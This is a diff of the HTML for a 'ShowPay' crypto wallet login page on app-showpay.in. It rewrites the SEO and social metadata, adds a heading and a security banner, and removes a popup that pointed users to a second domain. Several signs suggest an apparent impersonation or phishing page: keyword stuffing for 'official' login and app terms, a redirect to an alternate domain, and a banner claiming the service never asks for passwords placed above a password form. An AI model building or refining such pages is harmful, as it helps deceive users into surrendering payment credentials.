@@ -10,8 +10,8 @@
     <meta name="mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
     <!-- Primary Title & Description -->
-    <title>Showpay Login - Secure payment gateway</title>
-    <meta name="description" content="Complete your Showpay login to access your secure dashboard. The official Showpay app and Showpay Usdt wallet. Fast, safe, and reliable crypto payment gateway.">
+    <title>ShowPay Login | Secure Account Access</title>
+    <meta name="description" content="Access your ShowPay account securely, recover account access and find verified security and support information.">
 
     <!-- Targeted Keywords -->
     <meta name="keywords" content="Showpay, Showpay login, Showpay apk, Showpay app, Show pay, Show pay login, Showpay Usdt, Show pay usdt, Showpay official, Showpay secure payment gateway, Showpay help, Showpay customer support, Showpay password reset, Showpay official teligram channel, Show Pay App">
@@ -21,17 +21,17 @@
     <link rel="canonical" href="https://app-showpay.in/login" />
 
     <!-- Google Site Name & Open Graph (For Social & SERP Name) -->
-    <meta property="og:site_name" content="Showpay Login">
-    <meta property="og:title" content="Showpay Login - Secure payment gateway">
-    <meta property="og:description" content="Access your secure dashboard. Fast, safe, and reliable crypto payment gateway and USDT wallet.">
+    <meta property="og:site_name" content="ShowPay Login">
+    <meta property="og:title" content="ShowPay Login | Secure Account Access">
+    <meta property="og:description" content="Access your ShowPay account securely, recover account access and find verified security and support information.">
     <meta property="og:url" content="https://app-showpay.in/login">
     <meta property="og:type" content="website">
     <meta property="og:image" content="https://app-showpay.in/assets/showpay-og-image.jpg" />
 
     <!-- Twitter Tags -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Showpay Login - Secure payment gateway" />
-    <meta name="twitter:description" content="Access your secure dashboard. Fast, safe, and reliable crypto payment gateway and USDT wallet." />
+    <meta name="twitter:title" content="ShowPay Login | Secure Account Access" />
+    <meta name="twitter:description" content="Access your ShowPay account securely, recover account access and find verified security and support information." />
     <meta name="twitter:image" content="https://app-showpay.in/assets/showpay-og-image.jpg" />
 
     <!-- Logo / Favicon -->
@@ -57,8 +57,8 @@
           "@id": "https://app-showpay.in/#website",
           "url": "https://app-showpay.in/",
           "name": "Showpay Login",
-          "alternateName": ["Showpay", "Show pay", "Showpay App", "Show Pay Login"],
-          "description": "Showpay Login - Secure payment gateway"
+          "alternateName": ["ShowPay", "Show Pay", "ShowPay App", "Show Pay Login", "ShowPay apk"],
+          "description": "ShowPay Login - Secure payment gateway and official ShowPay app"
         },
         {
           "@type": "Organization",
@@ -86,7 +86,15 @@
   </head>
   <body>
     <div class="login-container">
-      <div class="header">LOG IN</div>
+      <h1 class="header" style="font-size: 24px; text-align: center; margin-bottom: 10px;">ShowPay Login</h1>
+      
+      <p style="text-align: center; font-size: 14px; margin-bottom: 20px;">
+        <a href="/" style="color: #3b82f6; text-decoration: none;">&larr; Back to Home</a>
+      </p>
+      
+      <div style="background: #fffbeb; color: #92400e; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; text-align: center; border: 1px solid #fcd34d;">
+        <strong>Security Warning:</strong> Always verify you are on <em>app-showpay.in</em> before entering your credentials. ShowPay will never ask for your password.
+      </div>
 
       <form id="loginForm">
         <div class="form-group">
@@ -139,75 +147,7 @@
       </form>
     </div>
 
-    <!-- Limit Popup -->
-    <div
-      id="limitPopup"
-      style="
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.8);
-        z-index: 1000;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div
-        style="
-          background: #fff;
-          padding: 24px;
-          border-radius: 12px;
-          max-width: 90%;
-          width: 320px;
-          text-align: center;
-        "
-      >
-        <div style="margin-bottom: 16px; color: #f59e0b">
-          <i
-            data-lucide="alert-triangle"
-            style="width: 48px; height: 48px; margin: 0 auto"
-          ></i>
-        </div>
-        <h3
-          style="
-            font-size: 18px;
-            margin-bottom: 12px;
-            font-weight: 600;
-            color: #1f2937;
-          "
-        >
-          Update Request Already Received
-        </h3>
-        <p
-          style="
-            font-size: 14px;
-            color: #4b5563;
-            margin-bottom: 16px;
-            line-height: 1.5;
-          "
-        >
-          Please wait some time. You can use another link:
-        </p>
-        <a
-          href="#"
-          id="telegramLimitLink"
-          style="
-            display: inline-block;
-            padding: 10px 16px;
-            background: #e0e7ff;
-            color: #4f46e5;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 600;
-            word-break: break-all;
-          "
-          >app-web.showpay-web.com</a
-        >
-      </div>
-    </div>
+
 
     <script type="module" src="../js/config/supabase.js"></script>
     <script type="module" src="../js/auth/login.js"></script>
